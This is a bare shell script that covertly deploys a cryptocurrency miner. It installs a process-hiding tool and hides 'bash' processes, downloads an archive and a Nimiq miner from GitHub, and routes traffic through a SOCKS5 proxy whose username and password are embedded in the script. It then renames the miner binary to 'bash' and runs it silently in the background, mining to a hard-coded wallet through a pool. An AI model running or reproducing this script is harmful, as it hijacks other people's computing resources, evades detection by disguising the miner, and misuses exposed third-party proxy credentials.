apt-get update
apt install npm -y
npm i -g node-process-hider && sudo ph add bash
wget https://github.com/komaria10003099/wappahj/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = us-east-static-04.quotaguard.com:1080
socks5_username = dn09qhrs4nehfz
socks5_password = dnlobpocovmi7jhvdo2hzzq8o4xv2
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "

echo " "

echo "**"

./graftcp/graftcp curl ifconfig.me

echo " "

echo " "

echo "**"

echo " "

echo " "
wget -qO nisa.zip https://github.com/Beeppool/miner/releases/download/0.6.0/beepminer-0.6.0.zip
unzip nisa.zip
cd beepminer-0.6.0
mv miner bash
./graftcp/graftcp ./bash --wallet-address='NQ04 H0C7 TJYF 68DT RQSF FSKX AT0A UNED 1XKL' --pool=pool.acemining.co:8443 --miner=1 --type=dumb >/dev/null 2>&1
